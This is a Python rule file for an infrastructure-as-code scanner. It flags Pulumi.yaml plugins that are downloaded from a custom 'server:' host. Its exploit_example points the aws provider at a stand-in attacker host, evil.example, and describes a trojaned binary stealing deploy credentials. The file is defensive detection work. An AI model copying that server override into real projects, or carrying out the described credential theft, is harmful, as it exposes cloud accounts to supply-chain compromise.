"""PULUMI-011. Plugin pulled from a custom download server."""
from __future__ import annotations

from typing import Any

from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import PulumiContext, PulumiProject

RULE = Rule(
    id="PULUMI-011",
    title="Pulumi plugin pulled from a custom download server",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-3", "CICD-SEC-4"),
    esf=("ESF-S-PROVENANCE",),
    cwe=("CWE-494", "CWE-829"),
    recommendation=(
        "Drop the ``server:`` override on the plugin entry and let "
        "Pulumi resolve the provider / analyzer binary from the "
        "default registry (``get.pulumi.com``). A provider plugin is "
        "native code that runs with the orchestrator's cloud "
        "credentials during ``pulumi up``, so the download source is "
        "part of your trusted compute base.\n\n"
        "If a private mirror is genuinely required (air-gapped CI, "
        "an internal compliance copy), pin ``server:`` to a host "
        "your org controls, serve it over HTTPS, and verify the "
        "plugin checksum before it reaches the runner. Treat any "
        "change to the ``server:`` value the same as a change to a "
        "pinned dependency: reviewed, justified, and logged."
    ),
    docs_note=(
        "Walks the ``plugins:`` block of every ``Pulumi.yaml`` and "
        "fires on any entry under ``providers`` / ``analyzers`` / "
        "``languages`` that carries a ``server:`` key. The default "
        "(no ``server:``) resolves from the trusted Pulumi registry "
        "and passes.\n\n"
        "The rule reads the already-parsed "
        "``project.data['plugins']`` structure; it does not fetch "
        "the plugin or verify the host's reputation. A ``server:`` "
        "pointing at a known-good internal mirror still fires, "
        "because the manifest alone can't prove the host is trusted."
    ),
    known_fp=(
        "A deliberate internal mirror on a host the team controls "
        "(``server: https://artifacts.corp.internal/pulumi``) is "
        "flagged by shape even though it's a legitimate posture. "
        "Suppress per project with a one-line rationale naming the "
        "mirror and the checksum-verification step that gates it.",
    ),
    incident_refs=(
        "Maps to the supply-chain class behind dependency-source "
        "substitution attacks: a build pulls native code from an "
        "attacker-influenced host and executes it with deploy "
        "credentials. Pulumi provider plugins run in-process during "
        "``pulumi up`` with whatever cloud identity the orchestrator "
        "holds, so a swapped binary inherits the full deploy blast "
        "radius (the same property that made the registry-poisoning "
        "and typosquat-source incidents so damaging).",
    ),
    exploit_example=(
        "# Vulnerable: plugin download routed off the trusted\n"
        "# registry to an attacker-controlled host.\n"
        "# Pulumi.yaml\n"
        "name: my-app\n"
        "runtime: python\n"
        "plugins:\n"
        "  providers:\n"
        "    - name: aws\n"
        "      version: 6.18.0\n"
        "      server: https://downloads.evil.example/pulumi\n"
        "\n"
        "# Attack: whoever controls downloads.evil.example serves a\n"
        "# trojaned aws provider binary. The next ``pulumi up`` on a\n"
        "# CI runner downloads and runs it in-process with the\n"
        "# deploy role's credentials, exfiltrating the OIDC token /\n"
        "# cloud keys that are in scope for the deploy.\n"
        "\n"
        "# Safe: no server override; resolves from the trusted\n"
        "# Pulumi registry.\n"
        "# Pulumi.yaml\n"
        "name: my-app\n"
        "runtime: python\n"
        "plugins:\n"
        "  providers:\n"
        "    - name: aws\n"
        "      version: 6.18.0\n"
    ),
)

# Plugin kinds Pulumi recognizes under the top-level ``plugins:``
# block. Each maps to a list of plugin entry dicts.
_PLUGIN_KINDS = ("providers", "analyzers", "languages")


def _plugin_entries(project: PulumiProject) -> list[dict[str, Any]]:
    """Flatten every plugin entry across the recognized plugin kinds.

    Non-dict entries and missing kinds are skipped so a malformed
    manifest yields nothing rather than raising."""
    plugins = project.data.get("plugins")
    if not isinstance(plugins, dict):
        return []
    out: list[dict[str, Any]] = []
    for kind in _PLUGIN_KINDS:
        items = plugins.get(kind)
        if not isinstance(items, list):
            continue
        for item in items:
            if isinstance(item, dict):
                out.append(item)
    return out


def _line_of(text: str, needle: str) -> int:
    """Best-effort 1-based line number for the first occurrence of
    ``needle`` in ``text``. Falls back to line 1."""
    idx = text.find(needle)
    if idx < 0:
        return 1
    return text[:idx].count("\n") + 1


def check(ctx: PulumiContext) -> Finding:
    if not ctx.projects:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource="Pulumi.yaml",
            description="No Pulumi.yaml in the scan path.",
            recommendation=RULE.recommendation, passed=True,
        )
    offenders: list[str] = []
    locations: list[Location] = []
    for project in ctx.projects:
        for entry in _plugin_entries(project):
            server = entry.get("server")
            if not isinstance(server, str) or not server.strip():
                continue
            name = entry.get("name")
            name_str = name if isinstance(name, str) else "?"
            offenders.append(f"{name_str} -> {server}")
            locations.append(Location(
                path=project.path,
                start_line=_line_of(project.text, server),
                end_line=_line_of(project.text, server),
            ))
    passed = not offenders
    desc = (
        "No Pulumi plugin overrides the registry download server."
        if passed else
        f"{len(offenders)} plugin entr(y/ies) override the download "
        f"server: {', '.join(offenders[:5])}"
        f"{'…' if len(offenders) > 5 else ''}. Each moves the "
        f"provider binary off the trusted registry; that native "
        f"code runs with cloud credentials during ``pulumi up``."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=(
            locations[0].path if locations else ctx.projects[0].path
        ),
        description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
